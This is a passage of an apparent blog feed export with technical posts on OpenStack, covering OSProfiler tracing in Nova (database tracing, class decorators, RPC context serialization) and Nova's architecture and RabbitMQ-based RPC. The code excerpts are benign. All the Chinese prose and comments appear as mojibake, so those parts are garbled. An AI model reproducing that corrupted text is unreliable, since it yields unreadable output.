ä½¿ç”¨ osprofiler çš„ WSGI ä¸­é—´ä»¶</span><br><span class="line">    request_id &#x3D; oslo_middleware:RequestId</span><br><span class="line">    debug &#x3D; oslo_middleware:Debug</span><br></pre></td></tr></table></figure><h1 id="Nova-å¯ç”¨-OSProfiler"><a href="#Nova-å¯ç”¨-OSProfiler" class="headerlink" title="Nova å¯ç”¨ OSProfiler"></a>Nova å¯ç”¨ OSProfiler</h1><ol><li>è¿½è¸ªæ•°æ®åº“è°ƒç”¨</li><li>ç±»è¿½è¸ªè£…é¥°å™¨ @profiler.trace_cls</li><li>å…¬æœ‰æ–¹æ³•è£…é¥°å™¨</li></ol><ul><li>ç»„ä»¶ä¹‹é—´ REST API å¹¶éµå¾ª AMQP åè®®</li><li>ç»„ä»¶å†…éƒ¨ RPC</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">config.py             <span class="comment"># æ ¹æ®é…ç½®æ–‡ä»¶è®¾ç½® osprofiler</span></span><br><span class="line">service.py            <span class="comment"># æ ¹æ®é…ç½®æ–‡ä»¶è®¾ç½®é©±åŠ¨ï¼Œå¯ç”¨ WSGI ä¸­é—´ä»¶</span></span><br><span class="line">profiler.py           <span class="comment"># é‡å†™ WSGI ä¸­é—´ä»¶ç±»ã€ç±»è¿½è¸ªè£…é¥°å™¨x</span></span><br><span class="line">manager.py            <span class="comment"># å…¬æœ‰æ–¹æ³•è£…é¥°å™¨ï¼ˆæŠ½è±¡åŸºç±»ï¼‰</span></span><br><span class="line">rpc.py                <span class="comment"># è¿½è¸ªä¸Šä¸‹æ–‡åºåˆ—åŒ–/ååºåˆ—åŒ–</span></span><br><span class="line">utils.py              <span class="comment"># spawn/spawn_n è£…é¥°å™¨ï¼Œä¼ é€’ä¸Šä¸‹æ–‡</span></span><br><span class="line">db/sqlalchemy/api.py  <span class="comment"># è¿½è¸ªæ•°æ®åº“è°ƒç”¨</span></span><br></pre></td></tr></table></figure><p>db/sqlalchemy/api.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¿½è¸ªæ•°æ®åº“è°ƒç”¨</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">configure</span>(<span class="params">conf</span>):</span></span><br><span class="line">    main_context_manager.configure(**_get_db_conf(conf.database))</span><br><span class="line">    api_context_manager.configure(**_get_db_conf(conf.api_database))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> profiler_sqlalchemy <span class="keyword">and</span> CONF.profiler.enabled \</span><br><span class="line">            <span class="keyword">and</span> CONF.profiler.trace_sqlalchemy:</span><br><span class="line"></span><br><span class="line">        main_context_manager.append_on_engine_create(</span><br><span class="line">            <span class="keyword">lambda</span> eng: profiler_sqlalchemy.add_tracing(sa, eng, <span class="string">&quot;db&quot;</span>))     <span class="comment"># æ·»åŠ è¿½è¸ª</span></span><br><span class="line">        api_context_manager.append_on_engine_create(</span><br><span class="line">            <span class="keyword">lambda</span> eng: profiler_sqlalchemy.add_tracing(sa, eng, <span class="string">&quot;db&quot;</span>))     <span class="comment"># æ·»åŠ è¿½è¸ª</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ osprofiler ç±»è£…é¥°å™¨ï¼ˆcompute/api.pyï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@profiler.trace_cls(<span class="params"><span class="string">&quot;compute_api&quot;</span></span>)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">API</span>(<span class="params">base.Base</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;API for interacting with the compute manager.&quot;&quot;&quot;</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>å…¬æœ‰æ–¹æ³•è£…é¥°å™¨ï¼ˆæŠ½è±¡ç±»ï¼‰ï¼Œnova ç»„ä»¶å†…éƒ¨çš„æ¨¡å—éƒ½ç»§æ‰¿ <code>Manager</code> ç±»ï¼Œæ”¯æŒè¿½è¸ª</p><ul><li><code>ComputeManager</code>ã€<code>ConductorManager</code>ã€<code>SchedulerManager</code></li></ul><img src="https://i.loli.net/2021/06/06/RDOdQhbYyL1oPvm.png"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å…¬æœ‰æ–¹æ³•è£…é¥°å™¨</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ManagerMeta</span>(<span class="params">profiler.get_traced_meta(<span class="params"></span>), <span class="built_in">type</span>(<span class="params">PeriodicTasks</span>)</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Metaclass to trace all children of a specific class.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    This metaclass wraps every public method (not starting with _ or __)</span></span><br><span class="line"><span class="string">    of the class using it. All children classes of the class using ManagerMeta</span></span><br><span class="line"><span class="string">    will be profiled as well.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Adding this metaclass requires that the __trace_args__ attribute be added</span></span><br><span class="line"><span class="string">    to the class we want to modify. That attribute is a dictionary</span></span><br><span class="line"><span class="string">    with one mandatory key: &quot;name&quot;. &quot;name&quot; defines the name</span></span><br><span class="line"><span class="string">    of the action to be traced (for example, wsgi, rpc, db).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The OSprofiler-based tracing, although, will only happen if profiler</span></span><br><span class="line"><span class="string">    instance was initiated somewhere before in the thread, that can only happen</span></span><br><span class="line"><span class="string">    if profiling is enabled in nova.conf and the API call to Nova API contained</span></span><br><span class="line"><span class="string">    specific headers.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŠ½è±¡åŸºç±»</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Manager</span>(<span class="params">base.Base, PeriodicTasks, metaclass=ManagerMeta</span>):</span></span><br><span class="line">    __trace_args__ = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;rpc&quot;</span>&#125;    <span class="comment"># å¿…é¡»</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>çº¿ç¨‹é—´ä¼ é€’ä¸Šä¸‹æ–‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¿½è¸ªè¯·æ±‚ä¸Šä¸‹æ–‡</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProfilerRequestContextSerializer</span>(<span class="params">RequestContextSerializer</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">serialize_context</span>(<span class="params">self, context</span>):</span></span><br><span class="line">        _context = <span class="built_in">super</span>(ProfilerRequestContextSerializer,</span><br><span class="line">                         self).serialize_context(context)</span><br><span class="line"></span><br><span class="line">        prof = profiler.get()       <span class="comment"># è·å– osprofiler å®ä¾‹</span></span><br><span class="line">        <span class="keyword">if</span> prof:</span><br><span class="line">            <span class="comment"># FIXME(DinaBelova): we&#x27;ll add profiler.get_info() method</span></span><br><span class="line">            <span class="comment"># to extract this info -&gt; we&#x27;ll need to update these lines</span></span><br><span class="line">            trace_info = &#123;</span><br><span class="line">                <span class="string">&quot;hmac_key&quot;</span>: prof.hmac_key,</span><br><span class="line">                <span class="string">&quot;base_id&quot;</span>: prof.get_base_id(),</span><br><span class="line">                <span class="string">&quot;parent_id&quot;</span>: prof.get_id()</span><br><span class="line">            &#125;</span><br><span class="line">            _context.update(&#123;<span class="string">&quot;trace_info&quot;</span>: trace_info&#125;) <span class="comment"># æ·»åŠ è¿½è¸ªä¿¡æ¯</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> _context</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deserialize_context</span>(<span class="params">self, context</span>):</span></span><br><span class="line">        trace_info = context.pop(<span class="string">&quot;trace_info&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> trace_info:</span><br><span class="line">            profiler.init(**trace_info)     <span class="comment"># åˆå§‹åŒ– osprofiler å®ä¾‹</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>(ProfilerRequestContextSerializer,</span><br><span class="line">                     self).deserialize_context(context)</span><br></pre></td></tr></table></figure><h1 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h1><ul><li><a href="https://learnku.com/articles/31681">ä½¿ç”¨ OSProfiler å¯¹ OpenStack è¿›è¡Œæ€§èƒ½æµ‹é‡</a></li><li><a href="https://docs.openstack.org/zaqar/latest/admin/OSprofiler.html">OSprofiler Guide</a></li><li><a href="https://docs.openstack.org/ironic/pike/contributor/osprofiler-support.html">About OSProfiler</a></li><li><a href="https://github.com/openstack/osprofiler">openstack/osprofiler</a></li><li><a href="https://openstack.nimeyo.com/117882/openstack-dev-tracing-all-the-places">[openstack-dev] Tracing (all the places)</a></li></ul>]]></content>
    
    
    <summary type="html">ç»“åˆ Keystoneã€Glanceï¼ˆRockeyï¼‰ç­‰ç»„ä»¶æµ‹è¯•</summary>
    
    
    
    <category term="OpenStack" scheme="https://jckling.github.io/categories/OpenStack/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>OpenStack Nova æ¶æ„åŠæºç åˆ†æ</title>
    <link href="https://jckling.github.io/2021/05/23/OpenStack/OpenStack%20Nova/"/>
    <id>https://jckling.github.io/2021/05/23/OpenStack/OpenStack%20Nova/</id>
    <published>2021-05-23T08:40:09.000Z</published>
    <updated>2021-10-11T13:39:04.665Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ•´ä½“æ¶æ„"><a href="#æ•´ä½“æ¶æ„" class="headerlink" title="æ•´ä½“æ¶æ„"></a>æ•´ä½“æ¶æ„</h1><ul><li>nova å’Œå…¶ä»–ç»„ä»¶ä¹‹é—´çš„äº¤äº’ä½¿ç”¨ HTTP è¯·æ±‚</li><li>å†…éƒ¨ç»„ä»¶ä¹‹é—´ä½¿ç”¨ <a href="https://github.com/openstack/oslo.messaging">oslo_messaging</a> åº“å®ç° RPC è°ƒç”¨ï¼Œè¿™é‡Œè¿˜æ¶‰åŠæ¶ˆæ¯é˜Ÿåˆ— RabbitMQ ï¼Œéµå¾ª AMQP åè®®</li><li>å¤§éƒ¨åˆ† nova ç»„ä»¶éƒ½å¯ä»¥è¿è¡Œåœ¨å¤šä¸ªæœåŠ¡å™¨ä¸Šï¼Œç„¶åä½¿ç”¨ä¸€ä¸ªç®¡ç†å™¨ç›‘å¬ RPC æ¶ˆæ¯</li><li>è€Œ nova-compute æ˜¯è¿è¡Œåœ¨è®¡ç®—ä¸»æœºä¸Šçš„å•è¿›ç¨‹ï¼Œç”¨äºç®¡ç†è®¡ç®—èµ„æº</li><li>nova å†…éƒ¨ç»„ä»¶å…±äº«æœ¬åœ°æ•°æ®åº“ï¼Œé€šè¿‡å¯¹è±¡å±‚è®¿é—®ï¼Œç¡®ä¿å…¼å®¹æ€§å’Œå®‰å…¨æ€§<ul><li>nova-compute è®¿é—®æ•°æ®åº“ç”± nova-conductor ä»£ç†</li></ul></li></ul><img src="https://i.loli.net/2021/06/06/K51XMdUyPrRmupT.png"><p>å½“ç”¨æˆ·å‘èµ·ä¸€ä¸ªæ–°çš„è¯·æ±‚æ—¶ï¼Œè¯¥è¯·æ±‚ä¼šå…ˆåœ¨ nova-api ä¸­å¤„ç†ã€‚nova-api ä¼šå¯¹è¯·æ±‚è¿›è¡Œä¸€ç³»åˆ—æ£€æŸ¥ï¼ŒåŒ…æ‹¬è¯·æ±‚æ˜¯å¦åˆæ³•ï¼Œé…é¢æ˜¯å¦è¶³å¤Ÿç­‰ï¼›å½“æ£€æŸ¥ç”¨è¿‡åï¼Œnova-api å°±ä¼šä¸ºè¯¥è¯·æ±‚åˆ†é…ä¸€ä¸ªå”¯ä¸€çš„è™šæ‹Ÿæœº ID ï¼Œå¹¶åœ¨æ•°æ®åº“ä¸­æ–°å»ºå¯¹åº”çš„é¡¹æ¥è®°å½•è™šæ‹Ÿæœºçš„çŠ¶æ€ï¼›ç„¶åï¼Œnova-api ä¼šå°†è¯·æ±‚å‘é€ç»™ nova-conductor å¤„ç†ã€‚</p><p>nova-conductor ä¸»è¦ç®¡ç†æœåŠ¡ä¹‹é—´çš„é€šä¿¡å¹¶è¿›è¡Œä»»åŠ¡å¤„ç†ã€‚å®ƒåœ¨æ¥æ”¶åˆ°è¯·æ±‚ä¹‹åï¼Œä¼šä¸º nova-scheduler åˆ›å»ºä¸€ä¸ª RequestSpec å¯¹è±¡ç”¨æ¥åŒ…è£…ä¸è°ƒåº¦ç›¸å…³çš„æ‰€æœ‰è¯·æ±‚ä¿¡æ¯ï¼Œç„¶åè°ƒç”¨ nova-scheduler æœåŠ¡çš„ select_destination æ¥å£ã€‚</p><p>nova-scheduler é€šè¿‡æ¥æ”¶åˆ°çš„ RequestSpec å¯¹è±¡ï¼Œé¦–å…ˆå°† RequestSpec  å¯¹è±¡è½¬æ¢æˆ ResourceRequest å¯¹è±¡ï¼Œå¹¶å°†è¯¥å¯¹è±¡å‘é€ç»™ Placement è¿›è¡Œä¸€æ¬¡é¢„ç­›é€‰ï¼Œç„¶åä¼šæ ¹æ®æ•°æ®åº“ä¸­æœ€æ–°çš„ç³»ç»ŸçŠ¶æ€åšå‡ºè°ƒåº¦å†³å®šï¼Œå¹¶å‘Šè¯‰ nova-conductor æŠŠè¯¥è¯·æ±‚è°ƒåº¦åˆ°åˆé€‚çš„è®¡ç®—èŠ‚ç‚¹ä¸Šã€‚</p><p>nova-conductor åœ¨å¾—çŸ¥è°ƒåº¦å†³å®šåï¼Œä¼šæŠŠè¯·æ±‚å‘é€ç»™å¯¹åº”çš„ nova-compute æœåŠ¡ã€‚</p><p>æ¯ä¸ª nova-compute æœåŠ¡éƒ½æœ‰ç‹¬ç«‹çš„èµ„æºç›‘è§†å™¨ï¼ˆResource Trackerï¼‰ç”¨æ¥ç›‘è§†æœ¬åœ°ä¸»æœºçš„èµ„æºä½¿ç”¨æƒ…å†µã€‚å½“è®¡ç®—èŠ‚ç‚¹æ¥æ”¶åˆ°è¯·æ±‚æ—¶ï¼Œèµ„æºç›‘è§†å™¨èƒ½å¤Ÿæ£€æŸ¥ä¸»æœºæ˜¯å¦æœ‰è¶³å¤Ÿçš„èµ„æºã€‚</p><ul><li>å¦‚æœå¯¹åº”çš„èµ„æºè¶³å¤Ÿï¼Œnova-compute å°±ä¼šå…è®¸åœ¨å½“å‰ä¸»æœºä¸­å¯åŠ¨æ‰€è¦æ±‚çš„è™šæ‹Ÿæœºï¼Œå¹¶åœ¨æ•°æ®åº“ä¸­æ›´æ–°è™šæ‹ŸæœºçŠ¶æ€ï¼ŒåŒæ—¶å°†æœ€æ–°çš„ä¸»æœºèµ„æºæƒ…å†µæ›´æ–°åˆ°æ•°æ®åº“</li><li>å¦‚æœå½“å‰ä¸»æœºä¸ç¬¦åˆè¯·æ±‚çš„èµ„æºè¦æ±‚ï¼Œnova-compute ä¼šæ‹’ç»å¯åŠ¨è™šæ‹Ÿæœºï¼Œå¹¶å°†è¯·æ±‚é‡æ–°å‘ç»™ nova-conductor æœåŠ¡ï¼Œé‡è¯•æ•´ä¸ªè°ƒåº¦è¿‡ç¨‹</li></ul><img src="https://i.loli.net/2021/06/06/DizGwcpYRQhWKqS.jpg"><h2 id="ç»„æˆéƒ¨åˆ†"><a href="#ç»„æˆéƒ¨åˆ†" class="headerlink" title="ç»„æˆéƒ¨åˆ†"></a>ç»„æˆéƒ¨åˆ†</h2><ol><li><p>nova-api</p><p>æ¥å—å’Œå“åº”ç”¨æˆ·çš„è®¡ç®— API è°ƒç”¨</p></li><li><p>nova-api-metadata</p><p> æ¥å—æ¥è‡ªå®ä¾‹çš„å…ƒæ•°æ®è¯·æ±‚</p><p> <a href="https://docs.openstack.org/nova/latest/admin/metadata-service.html">Metadata service</a></p></li><li><p>nova-compute</p><p> é€šè¿‡ hypervisor API åˆ›å»ºå’Œç»ˆæ­¢è™šæ‹Ÿæœºå®ä¾‹çš„å®ˆæŠ¤è¿›ç¨‹ã€‚ä¾‹å¦‚ KVM/QEMU çš„ libvirtã€VMware çš„ VMwareAPI ã€‚</p><p> è¿è¡Œåœ¨å®ƒæ‰€ç®¡ç†çš„ hypervisor æœºå™¨ä¸Šï¼Œç®¡ç†ä¸è™šæ‹Ÿæœºç®¡ç†ç¨‹åºå’Œè™šæ‹Ÿæœºçš„é€šä¿¡ã€‚</p></li><li><p>nova-scheduler</p><p> ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è·å–è™šæ‹Ÿæœºå®ä¾‹è¯·æ±‚ï¼Œå¹¶å†³å®šåœ¨å“ªä¸ªæœåŠ¡å™¨ä¸Šè¿è¡Œã€‚</p></li><li><p>nova-conductor</p><p> å¤„ç†éœ€è¦åè°ƒçš„è¯·æ±‚ï¼ˆæ„å»º/è°ƒæ•´ï¼‰ã€å……å½“æ•°æ®åº“ä»£ç†æˆ–å¤„ç†å¯¹è±¡è½¬æ¢ã€‚ç”¨äºè¿æ¥ nova-apiã€nova-schedulerã€nova-compute æœåŠ¡ã€‚</p></li><li><p>nova-novncproxy</p><p> åè°ƒ nova-compute æœåŠ¡å’Œæ•°æ®åº“ä¹‹é—´çš„äº¤äº’ã€‚é¿å… nova-compute ç›´æ¥è®¿é—®æ•°æ®åº“ï¼Œä¸ºäº†æä¾›æ›´å¥½çš„ API å…¼å®¹æ€§ã€‚å»ºè®®ä¸è¦éƒ¨ç½²åœ¨ nova-compute æœåŠ¡æ‰€åœ¨çš„èŠ‚ç‚¹ä¸Šã€‚</p></li><li><p>nova-spicehtml5proxy</p><p> æä¾›é€šè¿‡ SPICE è¿æ¥è®¿é—®è¿è¡Œå®ä¾‹çš„ä»£ç†ï¼Œæ”¯æŒåŸºäºæµè§ˆå™¨çš„ HTML5 å®¢æˆ·ç«¯ã€‚</p></li><li><p>The queue</p><p> åœ¨å®ˆæŠ¤è¿›ç¨‹ä¹‹é—´ä¼ é€’æ¶ˆæ¯çš„ä¸­å¤®æ¶ˆæ¯é˜Ÿåˆ—ï¼Œé€šå¸¸ä½¿ç”¨ RabbitMQ ã€‚</p></li><li><p>SQL database</p><p> å­˜å‚¨äº‘åŸºç¡€è®¾æ–½çš„å¤§å¤šæ•°æ„å»ºæ—¶å’Œè¿è¡Œæ—¶çŠ¶æ€ï¼ŒåŒ…æ‹¬ï¼šå¯ç”¨çš„å®ä¾‹ç±»å‹ã€åœ¨ä½¿ç”¨çš„å®ä¾‹ã€å¯ç”¨çš„ç½‘ç»œã€é¡¹ç›®ã€‚</p></li></ol><h1 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h1><p>æ¶ˆæ¯ä»£ç†ï¼ˆRabbitMQ AMQP brokerï¼‰å…è®¸ nova å†…éƒ¨ç»„ä»¶ä»¥ä½è€¦åˆçš„æ–¹å¼è¿›è¡Œé€šä¿¡ï¼Œå»ºç«‹åœ¨å‘å¸ƒ/è®¢é˜…ï¼ˆpublish/subscribeï¼‰æ¨¡å¼ä¸Š</p><ul><li>è§£è€¦å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯</li><li>åŒæ­¥å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯</li><li>å¹³è¡¡è¿œç¨‹è°ƒç”¨</li></ul><p>nova ä½¿ç”¨ AMQP ä¸­çš„ç›´è¿ï¼ˆdirectï¼‰ã€æ‰‡å‹ï¼ˆfanoutï¼‰ã€ä¸»é¢˜ï¼ˆtopicï¼‰äº¤æ¢ï¼›</p><p>nova ä½¿ç”¨é€‚é…å™¨ç±»ï¼ˆadapterï¼‰å°†æ¶ˆæ¯å°è£…å’Œè§£å°ä»è€Œè°ƒç”¨å‡½æ•°ï¼Œå®ç°äº†ä¸¤ç§ RPC è°ƒç”¨</p><ul><li><code>rpc.call</code>ï¼šè¯·æ±‚ + å“åº”ï¼Œapi ä½œä¸ºæ¶ˆè´¹è€…ï¼ˆconsumerï¼‰</li><li><code>rpc.cast</code>ï¼šå•å‘ï¼Œapi ä½œä¸ºå‘å¸ƒè€…ï¼ˆpublisherï¼‰</li></ul><p>æ¯ä¸ª nova æœåŠ¡åœ¨åˆå§‹åŒ–æ—¶åˆ›å»ºä¸¤ä¸ªé˜Ÿåˆ—</p><ul><li>æ¥å—è·¯ç”±é”® <code>NODE-TYPE.NODE-ID</code>ï¼ˆä¾‹å¦‚ï¼Œ<code>compute.hostname</code>ï¼‰ï¼šnova-api éœ€è¦é‡å®šå‘åˆ°ç‰¹å®šèŠ‚ç‚¹</li><li>æ¥å—è·¯ç”±é”® <code>NODE-TYPE</code>ï¼ˆä¾‹å¦‚ï¼Œ<code>compute</code>ï¼‰ï¼š</li></ul><img src="https://i.loli.net/2021/06/06/ZvNb61tfPTlF9or.png"><p>æ¯ä¸ª nova å†…éƒ¨ç»„ä»¶éƒ½è¿æ¥åˆ°æ¶ˆæ¯ä»£ç†ï¼Œæ ¹æ®ä¸åŒçš„ä½œç”¨ï¼ŒæŠŠæ¶ˆæ¯é˜Ÿåˆ—ä½œä¸ºï¼š</p><ul><li>è°ƒç”¨è€…ï¼ˆInvokerï¼‰ï¼šnova-apiã€nova-schedulerï¼›é€šè¿‡ <code>rpc.call</code> å’Œ <code>rpc.cast</code> å‘æ¶ˆæ¯é˜Ÿåˆ—å‘é€æ¶ˆæ¯</li><li>å·¥ä½œè€…ï¼ˆWorkerï¼‰ï¼šnova-computeï¼›ä»æ¶ˆæ¯é˜Ÿåˆ—æ¥æ”¶æ¶ˆæ¯ï¼Œæ ¹æ® <code>rpc.call</code> è¿›è¡Œå“åº”</li></ul><h2 id="ç›¸å…³æ¦‚å¿µ"><a href="#ç›¸å…³æ¦‚å¿µ" class="headerlink" title="ç›¸å…³æ¦‚å¿µ"></a>ç›¸å…³æ¦‚å¿µ</h2><p><strong>ä¸»é¢˜å‘å¸ƒè€…ï¼ˆTopic Publisherï¼‰</strong></p><p>æ‰§è¡Œ <code>rpc.call</code> æˆ– <code>rpc.cast</code> æ“ä½œå°†å®ä¾‹åŒ–ä¸€ä¸ªä¸»é¢˜å‘å¸ƒè€…ï¼Œç”¨äºå°†æ¶ˆæ¯å‘é€åˆ°æ¶ˆæ¯é˜Ÿåˆ—ã€‚æ¯ä¸ªå‘å¸ƒè€…æ€»æ˜¯è¿æ¥åˆ°ç›¸åŒçš„ä¸»é¢˜äº¤æ¢æœºï¼ˆtopic-based exchangeï¼‰ï¼›ç”Ÿå‘½å‘¨æœŸä»…é™äºæ¶ˆæ¯ä¼ é€’ã€‚</p><p><strong>ç›´è¿æ¶ˆè´¹è€…ï¼ˆDirect Consumerï¼‰</strong></p><p>æ‰§è¡Œ <code>rpc.call</code> æ“ä½œå°†å®ä¾‹åŒ–ä¸€ä¸ªç›´è¿æ¶ˆè´¹è€…ï¼Œç”¨äºä»æ¶ˆæ¯é˜Ÿåˆ—æ¥æ”¶å“åº”æ¶ˆæ¯ã€‚æ¯ä¸ªæ¶ˆè´¹è€…è¿æ¥åˆ°å”¯ä¸€çš„ç›´è¿äº¤æ¢æœºï¼ˆdirect-based exchangeï¼‰ï¼›ç”Ÿå‘½å‘¨æœŸä»…é™äºæ¶ˆæ¯ä¼ é€’ã€‚</p><p><strong>ä¸»é¢˜æ¶ˆè´¹è€…ï¼ˆTopic Consumerï¼‰</strong></p><p>å½“å·¥ä½œè€…è¢«å®ä¾‹åŒ–åå°†å®ä¾‹åŒ–ä¸€ä¸ªä¸»é¢˜æ¶ˆè´¹è€…ï¼Œå¹¶å­˜åœ¨äºå·¥ä½œè€…çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸï¼›ä¸»é¢˜æ¶ˆè´¹è€…ç”¨äºä»æ¶ˆæ¯é˜Ÿåˆ—æ¥æ”¶æ¶ˆæ¯ï¼Œå¹¶è°ƒç”¨å·¥ä½œè€…å®šä¹‰çš„æ“ä½œã€‚ä¸»é¢˜æ¶ˆè´¹è€…é€šè¿‡å…±äº«/æ’ä»–é˜Ÿåˆ—ï¼ˆshared/exclusive queueï¼‰è¿æ¥åˆ°ç›¸åŒçš„ä¸»ä½“äº¤æ¢æœºã€‚æ¯ä¸ªå·¥ä½œè€…éƒ½æœ‰ä¸¤ä¸ªä¸»é¢˜æ¶ˆè´¹è€…ï¼Œä¸€ä¸ªå¤„ç† <code>rpc.cast</code>  ï¼Œè¿æ¥åˆ°äº¤æ¢é”®æ˜¯ <code>topic</code> çš„å…±äº«é˜Ÿåˆ—ï¼›å¦ä¸€ä¸ªå¤„ç† <code>rpc.call</code> ï¼Œè¿æ¥åˆ°äº¤æ¢é”®æ˜¯ <code>topic.host</code> çš„ç‹¬ç«‹é˜Ÿåˆ—ã€‚</p><p><strong>ç›´è¿å‘å¸ƒè€…ï¼ˆDirect Publisherï¼‰</strong></p><p>æ‰§è¡Œ <code>rpc.call</code> æ“ä½œå°†å®ä¾‹åŒ–ä¸€ä¸ªç›´è¿å‘å¸ƒè€…ï¼Œç”¨äºè¿”å›è¯·æ±‚/å“åº”æ“ä½œæ‰€éœ€çš„æ¶ˆæ¯ï¼Œè¿æ¥åˆ°ç›´è¿äº¤æ¢æœºã€‚</p><p><strong>ä¸»é¢˜äº¤æ¢æœºï¼ˆTopic Exchangeï¼‰</strong></p><p>å­˜åœ¨äºè™šæ‹Ÿæœºä¸Šä¸‹æ–‡ä¸­çš„è·¯ç”±è¡¨ï¼›ç±»å‹ï¼ˆä¸»é¢˜/ç›´è¿ï¼‰å†³å®šäº†è·¯ç”±ç­–ç•¥ï¼›å¯¹äº nova ä¸­çš„æ¯ä¸ªä¸»é¢˜ï¼Œæ¶ˆæ¯ä»£ç†èŠ‚ç‚¹åªæœ‰ä¸€ä¸ªä¸»é¢˜äº¤æ¢æœºã€‚</p><p><strong>ç›´è¿äº¤æ¢æœºï¼ˆDirect Exchangeï¼‰</strong></p><p>åœ¨ <code>rpc.call</code> æ“ä½œä¸­åˆ›å»ºçš„è·¯ç”±è¡¨ï¼Œæ¶ˆæ¯ä»£ç†èŠ‚ç‚¹çš„ç”Ÿå‘½å‘¨æœŸä¸­æœ‰è®¸å¤šè¯¥å®ä¾‹ï¼Œå¯¹åº”æ¯ä¸ª <code>rpc.call</code> è°ƒç”¨ã€‚</p><p><strong>é˜Ÿåˆ—å…ƒç´ ï¼ˆQueue Elementï¼‰</strong></p><p>æ¶ˆæ¯æ¡¶ï¼Œæ¶ˆæ¯ä¸€ç›´ä¿å­˜åœ¨é˜Ÿåˆ—ä¸­ï¼Œç›´åˆ°æ¶ˆè´¹è€…ï¼ˆä¸»é¢˜/ç›´è¿ï¼‰è¿æ¥åˆ°é˜Ÿåˆ—è·å–æ¶ˆæ¯ã€‚é˜Ÿåˆ—å¯ä»¥æ˜¯å…±äº«çš„ä¹Ÿå¯ä»¥æ˜¯ç‹¬ç«‹çš„ï¼›è·¯ç”±é”®æ˜¯ <code>topic</code> çš„é˜Ÿåˆ—åœ¨ç›¸åŒç±»å‹çš„å·¥ä½œè€…ä¸­å…±äº«ã€‚</p><h2 id="rpc-call"><a href="#rpc-call" class="headerlink" 